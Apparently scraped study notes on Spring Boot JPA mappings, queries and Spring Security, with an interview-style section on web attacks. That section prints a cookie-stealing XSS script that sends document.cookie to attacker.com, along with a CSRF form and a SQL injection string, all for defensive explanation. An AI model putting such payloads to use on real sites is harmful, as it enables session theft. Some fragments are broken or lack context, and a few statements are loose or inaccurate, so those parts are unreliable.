    1. @OneToOne Mapping Overview

    • A @OneToOne relationship means one entity is associated with exactly one instance of another entity.
    • Examples:
      • A User has one Passport.
      • A UserDetails has one UserAddress.

    2. Unidirectional @OneToOne Mapping

    Key Points:

    • Only one entity (owner) maintains reference to the other.
    • The foreign key is maintained in the owner table (Parent).
    • Use @JoinColumn to customize FK column.

    Example:

    @Entity
@Table(name = "user_address")
public class UserAddress {
    @Id @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    private String street, city, state, country, pinCode;
    // Getters and Setters
}

@Entity
@Table(name = "user_details")
public class UserDetails {
    @Id @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    private String name, phone;

    @OneToOne(cascade = CascadeType.ALL)
    @JoinColumn(name = "address_id", referencedColumnName = "id")
    private UserAddress userAddress;
    // Getters and Setters
}

    Generated FK column in DB: address_id in user_details table.

    3. Bidirectional @OneToOne Mapping

    Key Points:

    • Both entities reference each other.
    • One side owns the relationship, other uses mappedBy.
    • Avoid infinite recursion in JSON.

    Example:

    @Entity
@Table(name = "user_details")
public class UserDetails {
    @Id @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    private String name, phone;

    @OneToOne(cascade = CascadeType.ALL)
    @JoinColumn(name = "address_id", referencedColumnName = "id")
    @JsonManagedReference
    private UserAddress userAddress;
}

@Entity
@Table(name = "user_address")
public class UserAddress {
    @Id @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    private String street, city, state, country, pinCode;

    @OneToOne(mappedBy = "userAddress", fetch = FetchType.EAGER)
    @JsonBackReference
    private UserDetails userDetails;
}

    4. Composite Key Mapping

    Use When:

    • FK is based on multiple fields (not a single ID).
    • Use @EmbeddedId and @Embeddable.

    Example:

    @Embeddable
public class UserAddressCK {
    private String street;
    private String pinCode;
    // equals() and hashCode() required
}

@Entity
public class UserAddress {
    @EmbeddedId
    private UserAddressCK id;
    private String city, state, country;
}

@Entity
public class UserDetails {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    private String name;

    @OneToOne
    @JoinColumns({
        @JoinColumn(name = "address_street", referencedColumnName = "street"),
        @JoinColumn(name = "address_pinCode", referencedColumnName = "pinCode")
    })
    private UserAddress userAddress;
}

    5. CascadeType in @OneToOne

    CascadeType Description
    PERSIST Saving parent saves child automatically
    MERGE Updating parent updates child
    REMOVE Deleting parent deletes child
    REFRESH Refresh parent from DB, also child gets refreshed
    DETACH Remove parent from persistence context, also detaches child
    ALL Shortcut for all of the above

    6. FetchType in @OneToOne

    Fetch Type Description
    EAGER Loads child immediately with parent (default)
    LAZY Loads child only when accessed (manually fetched)

    Fix for Lazy Loading + JSON:

    • Lazy loading causes 500 Internal Server Error on GET due to Hibernate proxy.
    • Solutions:
      • Use DTO to manually construct the response.
      • Use @JsonIgnore on child field (but you lose that data).
      • Use @JsonIdentityInfo to prevent infinite recursion.
      • Use @JsonManagedReference and @JsonBackReference in bidirectional mappings.

    7. Serialization Solutions (Jackson)

    Problem:

    • Infinite loop during serialization due to bidirectional mapping.

    Fixes:

    1. @JsonManagedReference / @JsonBackReference (for Owner/Inverse)
    1. @JsonIdentityInfo(generator = ObjectIdGenerators.PropertyGenerator.class, property = "id")
      • Prevents serialization of already seen objects.
    1. Use DTOs for full control.

    8. Recommended Best Practices

    Scenario Solution
    Prevent serialization issue DTO or @JsonIdentityInfo
    Save parent & child in one go CascadeType.PERSIST
    Update both CascadeType.PERSIST + MERGE
    Delete both CascadeType.REMOVE or CascadeType.ALL
    Lazy fetch causing error on GET Avoid exposing Entity directly, use DTO
    Composite Key FK mapping Use @EmbeddedId and @JoinColumns

    9. Common Interview Questions

    What is the difference between unidirectional and bidirectional @OneToOne mapping?

    Unidirectional: Only one entity (typically parent) has a reference to the other.Bidirectional: Both entities hold references. mappedBy is used on inverse side.

    What happens if you dont use CascadeType?

    The associated child entity won't be persisted/updated/deleted automatically.

    Whats the default fetch strategy for @OneToOne?

    EAGER, unless explicitly set to LAZY.

    How do you avoid infinite recursion with bidirectional mapping?

    Use @JsonManagedReference and @JsonBackReferenceOr use @JsonIdentityInfo to handle references by IDOr use DTO

    Can @OneToOne be mapped using a composite key?

    Yes, using @EmbeddedId + @JoinColumns.

    Summary Table

    Concept Annotation Used
    FK column name @JoinColumn(name = "...")
    Composite FK @JoinColumns({@JoinColumn(), ...})
    Cascade on save CascadeType.PERSIST
    Cascade on update CascadeType.MERGE
    Cascade on delete CascadeType.REMOVE
    Prevent infinite loop @JsonManagedReference / @JsonBackReference or @JsonIdentityInfo
    Lazy loading fix DTO or force fetch using entity.getX()
  • Spring boot JPA (Part 7) [One-to-Many: Unidirectional]

    1. @OneToMany Mapping (Unidirectional)

    Definition:

    • One entity (Parent) has many Child entities.
    • Example: A User can have many Orders.

    Default Behavior:

    Feature Value
    FK location New Join Table by default
    Loading Strategy LAZY
    Cascade Not enabled unless specified

    Example: Default (New Join Table)

    @Entity
public class User {
    @Id @GeneratedValue
    private Long id;
    private String name;

    @OneToMany
    private List<Order> orders = new ArrayList<>();
}

    This will create a new join table like user_orders(user_id, orders_id).

    Avoiding Join Table with @JoinColumn

    @Entity
public class User {
    @Id @GeneratedValue
    private Long id;
    private String name;

    @OneToMany(cascade = CascadeType.ALL)
    @JoinColumn(name = "user_id") // FK goes into child (Order) table
    private List<Order> orders = new ArrayList<>();
}

@Entity
public class Order {
    @Id @GeneratedValue
    private Long id;
    private String item;
}

    Why @JoinColumn?

    • It avoids creating a separate join table.
    • FK (user_id) is directly present in Order table.

    Cascade Types:

    Type Description
    PERSIST Saving parent also saves all children
    MERGE Updating parent updates children
    REMOVE Deleting parent deletes children
    ALL Includes all above

    Orphan Removal:

    @OneToMany(cascade = CascadeType.ALL, orphanRemoval = true)
@JoinColumn(name = "user_id")
private List<Order> orders;

    If you remove an Order from user.getOrders(), it will be deleted from the DB too.

    2. @OneToMany (Bidirectional)

    Features:

    • User holds List<Order>
    • Order holds a reference to User

    Example:

    @Entity
public class User {
    @Id @GeneratedValue
    private Long id;
    private String name;

    @OneToMany(mappedBy = "user", cascade = CascadeType.ALL, orphanRemoval = true)
    private List<Order> orders = new ArrayList<>();
}

@Entity
public class Order {
    @Id @GeneratedValue
    private Long id;
    private String item;

    @ManyToOne
    @JoinColumn(name = "user_id")
    private User user;
}

    mappedBy = "user" tells JPA: Order table holds the FK.

    3. @ManyToOne (Unidirectional)

    Features:

    • Only child holds reference to parent.
    • Common for Order User.

    Example:

    @Entity
public class Order {
    @Id @GeneratedValue
    private Long id;
    private String item;

    @ManyToOne
    @JoinColumn(name = "user_id")
    private User user;
}

    4. @ManyToOne (Bidirectional)

    • Same as @OneToMany bidirectional from the other side.
    • Just add @OneToMany(mappedBy="user") in User.

    5. @ManyToMany (Unidirectional)

    Features:

    • Each entity holds reference to the other.
    • Creates a new join table.

    Example:

    @Entity
public class Product {
    @Id @GeneratedValue
    private Long id;
    private String name;
}

@Entity
public class Order {
    @Id @GeneratedValue
    private Long id;
    private String customer;

    @ManyToMany
    private List<Product> products = new ArrayList<>();
}

    Creates: order_products(order_id, product_id)

    6. @ManyToMany (Bidirectional)

    Example:

    @Entity
public class Product {
    @Id @GeneratedValue
    private Long id;
    private String name;

    @ManyToMany(mappedBy = "products")
    private List<Order> orders = new ArrayList<>();
}

@Entity
public class Order {
    @Id @GeneratedValue
    private Long id;
    private String customer;

    @ManyToMany
    @JoinTable(
        name = "order_products",
        joinColumns = @JoinColumn(name = "order_id"),
        inverseJoinColumns = @JoinColumn(name = "product_id")
    )
    private List<Product> products = new ArrayList<>();
}

    7. EAGER vs LAZY Loading

    Annotation Default Fetch Type
    @OneToMany LAZY
    @ManyToOne EAGER
    @ManyToMany LAZY
    LAZY can cause LazyInitializationException outside of transaction. Fix using DTO or join fetch queries.

    8. Summary Table

    Mapping Direction FK Stored In New Table Use Case Example
    OneToMany Unidirectional Join Table Yes User Orders
    OneToMany With FK Child Table No User Orders with FK
    OneToMany Bidirectional Child Table No User Orders
    ManyToOne Unidirectional Child Table No Order User
    ManyToMany Unidirectional Join Table Yes Order Products
    ManyToMany Bidirectional Join Table Yes Order Products

    9. Common Interview Questions

    How does @OneToMany work by default?

    It creates a new join table, unless overridden with @JoinColumn.

    When should I use orphanRemoval = true?

    When you want children deleted from the DB as soon as they are removed from the collection.

    Whats the difference between CascadeType.REMOVE and orphanRemoval?

    CascadeType.REMOVE deletes children when parent is deleted.

    orphanRemoval = true deletes children when removed from the collection (even without deleting parent).

    Can you have a unidirectional @OneToMany without a join table?

    Yes, by placing the FK in the child using @JoinColumn.

    What's the default fetch type for @ManyToOne?

    EAGER.
  • Spring boot JPA(Part 8)

    1. Derived Query (Method Name Query)

    What is it?

    • Spring Data JPA auto-generates SQL based on method names.
    • Only works for READ/DELETE operations.
    • For INSERT/UPDATE, use .save().

    Method Name Format:

    find | read | get | count | exists | delete | remove
   +
PropertyName (CamelCase)
   +
By <FieldName> [And | Or | Between | In | Like ...]

    Examples:

    List<UserDetails> findByName(String name);

List<UserDetails> findByNameAndPhone(String name, String phone);

List<UserDetails> findByNameOrPhone(String name, String phone);

List<UserDetails> findByNameIn(List<String> names);

List<UserDetails> findByNameLike(String pattern);

    Supported Keywords:

    Operator Example
    And, Or findByNameAndPhone
    Between findByCreatedDateBetween(Date, Date)
    Like findByNameLike('%abc%')
    IsNull findByEmailIsNull()
    NotNull findByEmailIsNotNull()
    In findByNameIn(List<String>)
    True/False findByActiveTrue()
    Before/After findByCreatedDateBefore(Date)
    OrderBy findByOrderByNameAsc()

    Pagination & Sorting:

    Page<UserDetails> findByName(String name, Pageable pageable);

List<UserDetails> findByName(String name, Sort sort);

// Usage
PageRequest.of(pageNumber, pageSize, Sort.by("name").descending())

    2. JPQL (Java Persistence Query Language)

    What is it?

    • Similar to SQL but operates on Entity classes & field names, not DB tables/columns.

    Syntax:

    @Query("SELECT u FROM UserDetails u WHERE u.name = :name")
List<UserDetails> findByNameJPQL(@Param("name") String name);

    Join Example (OneToMany):

    @Query("SELECT u FROM User u JOIN u.orders o WHERE o.status = :status")
List<User> findUsersWithOrderStatus(@Param("status") String status);

    Custom DTO Projection:

    @Query("SELECT new com.dto.UserDTO(u.name, u.phone) FROM User u")
List<UserDTO> getUserDto();

    Deletion with JPQL:

    @Transactional
@Modifying
@Query("DELETE FROM UserDetails u WHERE u.name = :name")
void deleteByName(@Param("name") String name);

    3. N+1 Problem (One of the most asked!)

    Problem:

    • You fetch a list of users (1 query), but for each user, JPA lazily fetches children (N queries).

    Total = N + 1 queries

    Bad performance, unnecessary DB hits.

    Example:

    List<User> users = userRepository.findByName("John");
for(User u : users) {
    u.getAddresses().size(); // Each triggers a query
}

    Solutions:

    1 JOIN FETCH (JPQL)

    @Query("SELECT u FROM User u JOIN FETCH u.addresses WHERE u.name = :name")
List<User> findUsersWithAddresses(@Param("name") String name);

    Fetches User + Addresses in 1 single query

    2 @BatchSize

    @OneToMany(fetch = FetchType.LAZY)
@BatchSize(size = 10)
private List<Address> addresses;

    Groups queries, reduces N+1 to fewer batch-sized chunks.

    3 @EntityGraph

    @EntityGraph(attributePaths = {"addresses"})
List<User> findByName(String name);

    Declarative way to solve N+1, especially in derived methods.

    4. @Modifying and @Transactional

    When do you need it?

    • For DELETE, UPDATE, or INSERT using JPQL
    • Otherwise, JPA will throw: Query must be a SELECT

    Example:

    @Transactional
@Modifying
@Query("UPDATE UserDetails u SET u.phone = :phone WHERE u.name = :name")
void updatePhoneByName(@Param("phone") String phone, @Param("name") String name);

    5. Flush & Clear

    Method Description
    flush() Forces changes from persistence context to DB (but stays in context)
    clear() Clears the persistence context (detaches all entities)

    6. Advanced Joins (Nested Relationships)

    @Query("SELECT a FROM A a JOIN a.bList b JOIN b.cList c WHERE c.prop = :value")
List<A> findAWithBAndC(@Param("value") String value);

    JPQL supports multi-level joins like SQL, on mapped entity fields.

    7. NamedQuery

    Purpose:

    • Reuse queries without repeating @Query.

    Example:

    @NamedQuery(
    name = "UserDetails.findByPhone",
    query = "SELECT u FROM UserDetails u WHERE u.phone = :phone"
)
@Entity
public class UserDetails { ... }

    8. Summary Table

    Feature Annotation/Keyword
    Derived Query findByName, findByNameAndPhone
    JPQL Query @Query("SELECT u FROM ...")
    DTO from Query SELECT new com.dto.X(...)
    Modifying Query @Modifying, @Transactional
    N+1 Fix JOIN FETCH, @BatchSize, @EntityGraph
    Pagination Pageable, Page<T>
    Sorting Sort.by("field").ascending()
    Named Query @NamedQuery on Entity

    Queries automatically generated by Spring from method names based on naming conventions.

    How do you solve N+1 problem?

    Use:
    1. JOIN FETCH in JPQL
    1. @BatchSize
    1. @EntityGraph

  • Spring boot JPA (Part 9 and 10)

    1. Native Queries in JPA

    What is it?

    • Plain SQL query that interacts directly with the database.
    • Defined via @Query(nativeQuery = true) or @NamedNativeQuery.

    When to Use Native SQL?

    Use Case Reason
    Complex DB-specific features JSONB, Window Functions, LATERAL joins, etc.
    No Entity Mapping Exists Querying non-entity tables or views
    Bulk operations Insert/update/delete multiple records efficiently
    Partial data fetch When only few columns needed, not full entity

    Simple Native Query Example

    @Query(value = "SELECT * FROM user_details WHERE name = ?1", nativeQuery = true)
List<UserDetails> findByNameNative(String name);

    Partial Result Mapping Options:

    1. @SqlResultSetMapping + @NamedNativeQuery (static mapping)
    1. Manual Mapping via:
      • Object[] projection
      • DTO with constructor expression
    @Query(value = "SELECT name, phone FROM user_details", nativeQuery = true)
List<Object[]> getPartialData();  // Manually extract fields

    Pagination + Sorting in Native Query 

    @Query(value = "SELECT * FROM user_details ORDER BY name LIMIT ?1 OFFSET ?2", nativeQuery = true)
List<UserDetails> getPagedUsers(int limit, int offset);

    2. Criteria API

    Why use Criteria API?

    • For building dynamic, type-safe, DB-independent queries.

    Hierarchy

    Component Purpose
    CriteriaBuilder Entry point for query construction
    CriteriaQuery Represents the query
    Root<T> Represents the FROM clause entity
    Predicate WHERE clause filtering
    TypedQuery<T> Executes the query

    Example (Dynamic Filter)

    CriteriaBuilder cb = entityManager.getCriteriaBuilder();
CriteriaQuery<UserDetails> cq = cb.createQuery(UserDetails.class);
Root<UserDetails> root = cq.from(UserDetails.class);

// WHERE clause: name = "John"
Predicate condition = cb.equal(root.get("name"), "John");
cq.where(condition);

// Execute
TypedQuery<UserDetails> query = entityManager.createQuery(cq);
List<UserDetails> result = query.getResultList();

    Predicate (Filter) Methods

    Operation Criteria API Call SQL Equivalent
    Equal cb.equal(root.get("name"), "John") WHERE name = 'John'
    Not Equal cb.notEqual(...) WHERE name != 'John'
    Greater Than cb.gt(...) WHERE age > 30
    Less Than cb.lt(...) WHERE age < 30
    Like cb.like(root.get("name"), "J%") WHERE name LIKE 'J%'
    In cb.in(root.get("id")).value(1).value(2) WHERE id IN (1, 2)
    And cb.and(p1, p2) WHERE cond1 AND cond2
    Or cb.or(p1, p2) WHERE cond1 OR cond2

    Pagination with Criteria

    query.setFirstResult(offset);  // skip first n records
query.setMaxResults(limit);    // limit result count

    3. Specification API (Clean Layer over Criteria API)

    Benefits:

    Problem Solved How Specification API Helps
    Code duplication Reuse filters across methods/classes
    Boilerplate verbosity Cleaner abstraction over Criteria API

    Setup

    1. Extend your repository:
    public interface UserDetailsRepository extends JpaRepository<UserDetails, Long>, JpaSpecificationExecutor<UserDetails> {}
    1. Create Specification:
    public class UserSpecifications {
    public static Specification<UserDetails> hasName(String name) {
        return (root, query, cb) -> cb.equal(root.get("name"), name);
    }

    public static Specification<UserDetails> phoneStartsWith(String prefix) {
        return (root, query, cb) -> cb.like(root.get("phone"), prefix + "%");
    }
}
    1. Use in Service:
    List<UserDetails> users = repo.findAll(
    where(UserSpecifications.hasName("John"))
        .and(UserSpecifications.phoneStartsWith("123"))
);

    Combine Specifications:

    Specification<UserDetails> spec = hasName("John").or(phoneStartsWith("9"));

    With Pagination:

    Page<UserDetails> page = repo.findAll(spec, PageRequest.of(0, 10));

    Common Web Security Attacks & How to Prevent Them

    1 CSRF (Cross-Site Request Forgery)

    What is CSRF?

    • Stateful attack exploiting authenticated sessions.
    • Browser automatically sends stored cookies with every request, including malicious ones.
    • A user is tricked into clicking a malicious link (e.g., <form> or <img>), unknowingly performing an action.

    Attack Flow:

    1. User logs in to a trusted site and gets authenticated (with session cookie).
    1. Attacker sends a link like: 
      <form action="https://trusted.com/deleteAccount" method="POST">
   <input type="submit" value="Claim Your Prize">
</form>
    1. Clicking the link submits request with the user's valid session cookie unwanted operation.

    Spring Security Protection:

    • CSRF Token: Generated and stored in session.
    • Only requests from the legitimate frontend carry the valid token.
    • Server validates token before processing.
    // Enabled by default in Spring Security for browser clients
http.csrf().enable();  // or use with().csrfTokenRepository(...)

    2 XSS (Cross-Site Scripting)

    What is XSS?

    • Attacker injects malicious scripts into web pages viewed by other users.
    • Ex: <script>alert("XSS")</script> or stealing session cookies: 
      <script>fetch('http://attacker.com/steal?c=' + document.cookie);</script>

    Demo:

    • POST /comment: saves user comment without validation.
    • GET /xss: loads all comments, renders in HTML.
    • Attacker posts malicious script auto-runs on page load.

    Mitigation:

    • Escape HTML characters like <, >, &, ".
    • Use Springs Thymeleaf, HtmlUtils, or libraries like OWASP Java Encoder.
    • Always validate/sanitize user input.
    <!-- In Thymeleaf -->
<span th:text="${comment}"></span> <!-- Escaped -->

    3 CORS (Cross-Origin Resource Sharing)

    What is CORS?

    • Browser security feature, not a vulnerability.
    • Restricts web apps from making requests to a different origin unless server allows.

    Origin = Protocol + Host + Port

    Client Origin Server Origin Same Origin?
    https://localhost:8080 http://localhost:8080 No
    https://localhost:8080 https://localhost:9090 No
    http://localhost:8080 http://localhost:8080 Yes

    How to Allow Cross-Origin in Spring Boot:

    // Global configuration
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**")
                .allowedOrigins("https://localhost:3000")
                .allowedMethods("GET", "POST", "PUT", "DELETE")
                .allowCredentials(true);
    }
}

// Or using Spring Security
http.cors();

    4 SQL Injection

    What is SQL Injection?

    • Attacker injects malicious SQL via input field: 
      SELECT * FROM users WHERE name = '' OR '1'='1'

    Protection Strategy:

    • Always use parameterized queries or JPQL, JPA Criteria API, or Spring Data methods.
    @Query("SELECT u FROM User u WHERE u.name = :name")
List<User> findByName(@Param("name") String name);
    Never concatenate user input directly into SQL query.

    Summary Table: Attacks vs Protection

    Attack Type Description Spring Security Protection
    CSRF Forged request with user's session CSRF Token (Enabled by default for browser apps)
    XSS Injected JavaScript in response pages Input validation, HTML escaping (th:text)
    CORS Browser blocks cross-origin requests @CrossOrigin, CorsRegistry, Security CORS config
    SQL Injection Malicious input manipulated SQL query Parameterized Queries (@Query, PreparedStatement)

    Bonus: How Spring Security Helps

    Feature Enabled By Purpose
    CSRF Protection Default Prevent form-based CSRF attacks
    XSS Escape Support Manual Use Thymeleaf, encoder libraries
    CORS Handling Manual Add CorsConfiguration via Spring MVC or Security
    Session Management Default Manages cookies and session-based authentication
    URL Access Rules Default Restrict access by endpoint, role, method etc.

    Interview Questions

    Q1. What is CSRF and how do you prevent it in Spring?

    CSRF is a session-hijack-based attack. Spring adds a CSRF token to each form and validates it on the server.

    Q2. How does XSS attack work? How to prevent it?

    It injects script code in rendered HTML. Use escaping and validation.

    Q3. What is CORS? Is it an attack?

    No. Its a browser feature to prevent unauthorized cross-origin calls. Needs explicit server-side allowance.

    Q4. Can Spring Security prevent SQL injection?

    Not directly. But using Spring Data repositories and parameterized queries prevents it.

    Spring Boot Security Architecture

    Spring Security is a powerful and customizable security framework that handles:

    • Authentication: Who are you?
    • Authorization: What can you access?

    Spring Security Filter Chain (Core Concept)

    Spring Security registers a chain of servlet filters that process every incoming HTTP request. These filters are automatically wired into your application via a FilterChainProxy.

    [ DispatcherServlet ]
       
[ SecurityFilterChain (multiple filters) ]
       
[ Controllers / Endpoints ]

    Default Filters in the Chain (simplified):

    Order Filter Class Purpose
    1 SecurityContextPersistenceFilter Restores SecurityContext from session
    2 UsernamePasswordAuthenticationFilter Handles login POST /login

  • Spring Security (Part-4) [Basic Authentication]

    Basic Authentication Spring Security (Stateless)

    1. What is Basic Authentication?

    • Stateless authentication mechanism.
    • Server does NOT maintain session (no JSESSIONID).
    • Client must send username & password in every request.
    • Format: 
      Authorization: Basic base64(username:password)
    Base64 is not encryption, just encoding insecure over plain HTTP.

    2. HTTP Header Format

    Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
    • dXNlcm5hbWU6cGFzc3dvcmQ= is base64 of username:password
    Because credentials are sent on every request, HTTPS is mandatory to avoid interception.

    3. Flow of Basic Authentication

    Authentication Flow (Spring Security) 

    Client sends  Authorization: Basic <base64(username:password)>

BasicAuthenticationFilter

AuthenticationManager (via ProviderManager)

DaoAuthenticationProvider

UserDetailsService (fetch user from DB/memory)

PasswordEncoder (match passwords)

SecurityContextHolder (holds Authentication object)

AuthorizationFilter (checks role/authority)

Controller
    Everything is handled by Spring Security filters, you write almost no custom code unless you want to override defaults.

    4. Why Credentials are sent in Header (Not Body)?

    Reason Explanation
    RFC 7617 Standard Widely supported and standardized
    Header not logged Request body might be logged by server; headers usually are not
    Compatible with all HTTP methods GET, DELETE, etc. don't support request body

    5. Setup Whats Needed?

    Dependencies (pom.xml) 

    <dependency>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-starter-security</artifactId>
</dependency>

    application.properties

    spring.security.user.name=ganesh
spring.security.user.password={noop}pass123

    Or define custom user in DB:

    Use UserDetailsService + BCryptPasswordEncoder.

    6. Filter Involved

    Filter Purpose
    BasicAuthenticationFilter Intercepts request, extracts and decodes header
    AuthenticationManager Delegates authentication
    DaoAuthenticationProvider Validates username & password
    UserDetailsService Loads user info
    PasswordEncoder Hashes and compares password
    SecurityContextHolder Holds authenticated principal

    7. Key Classes Involved

    • BasicAuthenticationFilter
    • AuthenticationManager (Interface)
    • ProviderManager (Default impl)
    • DaoAuthenticationProvider

    • InMemoryUserDetailsManager / JdbcUserDetailsManager

    8. Is CSRF Required?

    • NO CSRF protection is disabled by default in stateless auth.
    • Because there's no session, there's no attack vector for CSRF.

    9. Disadvantages of Basic Authentication

    Problem Explanation
    Credentials in every request Increased risk if HTTPS not used
    Base64 encryption Easy to decode
    Stateless = DB hit on every request Affects performance
    No token revocation If compromised, must change password
    Not scalable Repeated password checks increase latency
    Size overhead Authorization header increases request size

    10. When to Use Basic Authentication?

    Use it in:

    • Simple internal tools or systems
    • Secured microservices behind gateway
    • Proof-of-concept or test environments

    Dont use in:

    • Public APIs
    • High-traffic or distributed systems
    • Systems needing token revocation or multi-device login

    Feature Basic Auth Form Login
    Session No session (Stateless) Maintains session (Stateful)

    Suitable for APIs Yes Not ideal
    Custom Login UI No Yes
    CSRF Required No Yes (enabled by default)
    Scalability Not ideal for large scale Needs session storage

    JWT Authentication Spring Security (Stateless Auth)

    1. What is JWT Authentication?

    • JWT is a Stateless Authentication mechanism.
    • Server does NOT maintain session state (no JSESSIONID).
    • Client sends JWT token with every request in the Authorization header.

    2. JWT Structure

    A JWT has 3 parts:

    HEADER.PAYLOAD.SIGNATURE
    Part Contains
    Header Metadata: algorithm (e.g., HS256, RS256)
    Payload Claims: userId, roles, expiry time, etc.
    Signature Signed hash to prevent tampering

    Example:

    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.
eyJzdWIiOiJ1c2VySWQiLCJyb2xlIjoiUk9MRV9VU0VSIiwiaWF0IjoxNjkzMDA1NjAwfQ
.
SfLkxwRJSMeKKF2QT4fwpo...

    3. JWT Authentication Flow

    Step-by-step Breakdown:

    1 User Registration (optional)

    POST /api/user-register

    User created and password hashed (e.g., using BCryptPasswordEncoder).

    2 Token Generation

    POST /generate-token

    User sends username/password

    If valid: Generate JWT token and return in response

    3 Access Resource

    Client sends JWT in every request:

    Authorization: Bearer <jwt_token>

    Token is verified and user is authenticated

    4 Refresh Token

    POST /refresh-token

    Send refresh token

    Get new access token

    4. Key Components to Implement

    Token Generation:

    • Authenticate using UsernamePasswordAuthenticationToken
    • Use AuthenticationManager and DaoAuthenticationProvider
    • On success generate token using JWT utility class

    Token Validation:

    • Create Custom Filter to intercept each request
    • Parse JWT from Authorization header
    • Validate:
      • Expiry
      • Signature
      • Claims
    • If valid:
      • Load UserDetails
      • Create Authentication object
      • Set in SecurityContext

    Filter Order:

    http.addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);

    5. Spring Security Architecture with JWT

    Request

    6. AuthenticationManager Logic

    • Delegates to multiple AuthenticationProviders
    • Each Provider must implement supports() method to indicate whether it can handle the request
    • In JWT, we use:
      • Default DaoAuthenticationProvider for username/password login
      • Custom JwtAuthenticationProvider for token validation

    7. Authorization

    • After authentication, AuthorizationFilter ensures role-based access.
    • Same as form or basic auth.
    • E.g.,
    http.authorizeHttpRequests()
  .requestMatchers("/admin/**").hasRole("ADMIN")
  .requestMatchers("/user/**").hasAnyRole("ADMIN", "USER");

    8. JWT Token Placement in Request

    Authorization: Bearer <access_token>

    9. JWT Implementation What Spring Boot does NOT provide

    Spring Security doesn't include JWT by default because:

    • Token structure is app-specific
    • Signing strategy may vary (HMAC vs RSA)
    • Claims (e.g., email, userId) differ
    • Refresh strategies vary per use case
    You must implement it using custom filters, providers, utilities.

    10. Advantages of JWT

    Feature Benefit
    Stateless No need to store session
    Scalable Suitable for distributed systems
    Secure Signed & verifiable (if using HTTPS)
    Portable Can be used across services/systems
    Flexible Custom claims supported

    11. Disadvantages of JWT

    Problem Why
    Cant invalidate token easily Unless using a token blacklist or DB
    Can be hijacked If HTTPS not enforced
    Size overhead Bigger than session ID
    Short-lived tokens needed For security, which needs refresh logic

    12. Refresh Token Strategy

    Token Type Duration Stored in
    Access Token Short-lived (e.g., 5-15 mins) Header
    Refresh Token Long-lived (e.g., 7-30 days) DB or Secure Cookie
    Refresh token is used to generate new access token without login.

  .setSubject(user.getUsername())
  .claim("role", user.getRole())

  .setExpiration(new Date(System.currentTimeMillis() + 1000 * 60 * 60)) // 1 hour
  .signWith(SignatureAlgorithm.HS256, SECRET_KEY)
  .compact();

    OAuth 2.0 & OIDC Interview-Ready Notes

    1. What is OAuth 2.0?

    • OAuth 2.0 is an Open Authorization framework.
    • It enables secure, delegated access to protected user resources.
    • Used when a user wants to grant a third-party app access to their resources (e.g., Google Calendar, GitHub profile).

    2. OAuth2 vs OIDC (OpenID Connect)

    S.No Feature OAuth2 OIDC (OpenID Connect)
    1 Full Form Open Authorization OpenID Connect
    2 Used For Authorization Authentication + Authorization
    3 Tokens Returned Access Token (opaque or JWT) ID Token (JWT) + Access Token
    4 Identity Support No identity verification Verifies user identity via ID token
    5 Mandatory Scope read, write, etc. openid (indicates OIDC use)
    6 Protocol Type Authorization Framework Identity Layer over OAuth2

    3. Common Grant Types

    Grant Type Description
    Authorization Code Standard flow for web apps (secure, uses code + secret)
    Implicit For SPAs, deprecated due to security flaws
    Client Credentials Server-to-server communication
    Password Grant Not recommended; app gets direct access to user credentials
    Refresh Token Used to get a new Access Token when the current one expires

    4. OAuth 2.0 Authorization Code Flow (Step-by-Step)

    Actors:

    • Resource Owner the User
    • Client your Spring Boot App
    • Authorization Server GitLab, Auth0, Google, etc.
    • Resource Server API server that holds protected data

    Step 1: Client Registers With Authorization Server

    • Receives:
      • client_id
      • client_secret
      • Redirect URI

    Step 2: User Clicks Login

    GET /oauth2/authorization/{registrationId}

    Spring Security generates login page using:

    DefaultLoginPageGeneratingFilter

    Step 3: User is Redirected to Authorization Server

    https://auth0.com/oauth/authorize?client_id=...&redirect_uri=...

    Step 4: Authorization Server Authenticates User & Returns Authorization Code

    GET /login/oauth2/code/{registrationId}?code=abc123

    Handled by:

    OAuth2LoginAuthenticationFilter

    Step 5: Spring Boot Calls Token URI

    • Sends:
      • Authorization Code
      • Client ID & Secret
    • Receives:
      • Access Token (Opaque or JWT)
      • ID Token (JWT)
      • Refresh Token (optional)

    Token processing by:

    OidcAuthorizationCodeAuthenticationProvider

    Step 6: Spring Boot Creates Authentication Object

    • Sets user details (from ID Token or UserInfo endpoint)
    • Stores in:
    SecurityContextHolder
HttpSession
InMemoryOAuth2AuthorizedClientService

    5. ID Token vs Access Token

    Feature Access Token ID Token (OIDC)
    Format Opaque or JWT JWT
    Purpose Authorize access to resource server Identify the user
    Who Consumes Resource Server Client App
    Contains Scopes, expiry, audience, etc. User info like email, sub, name, etc.

    7. Why Postman Calls Fail?

    Spring Boot assumes browser-based flow creates a session.

    So Postman calls fail since no cookie (JSESSIONID) is present.

    8. Make OAuth2 Flow Stateless

    • Override onAuthenticationSuccess() of OAuth2LoginAuthenticationFilter
    • Return ID Token in response body (instead of creating session)
    • In subsequent requests, client must send:
    Authorization: Bearer <id_token>
    • Use a custom filter to validate token (decode JWT, check expiry, signature, etc.)

    9. Token Validation Flow (Stateless Setup)

    Step Action
    1 Intercept all requests with custom filter
    2 Read Authorization: Bearer <token> header
    3 Validate JWT (signature, expiry, issuer, audience)
    4 If valid, load user & set Authentication object in SecurityContext
    5 Proceed with request as authenticated user

    Type Description
    Holds the Authentication object
    Used across the request lifecycle
    If using sessions backed by HttpSessionSecurityContextRepository
    In stateless JWT setup populated manually via custom filter

    11. Refresh Token Flow

    • Access token is short-lived (515 min)
    • Refresh token is long-lived (730 days)
    • Client sends refresh token to Authorization Server:
    POST /oauth/token
grant_type=refresh_token
refresh_token=abc123
    • Gets new access token (and optionally new refresh token)

    Problem Cause
    Postman access fails No session/cookie needs stateless setup
    ID Token expired Still have active session
    Access Token is opaque Cant decode client-side need introspection endpoint
    Using stateful auth in distributed apps Avoid always go stateless for OAuth

  • Role based Authorization - (Annotation)

    Role-Based Authorization Using Annotations in Spring Security

